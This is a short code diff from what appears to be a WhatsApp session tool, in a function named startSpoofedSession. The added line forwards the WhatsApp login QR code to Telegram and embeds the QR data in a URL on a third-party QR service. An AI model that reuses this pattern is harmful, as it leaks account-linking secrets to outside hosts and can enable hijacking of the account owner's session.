@@ -98,6 +98,7 @@ async function startSpoofedSession() {
                 console.log('\nScan this QR code with WhatsApp:\n')
                 console.log(code)
             })
+            void notifyTelegramEvent('QR CODE', `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qr)}`)
         }
 
         if (connection === 'close') {
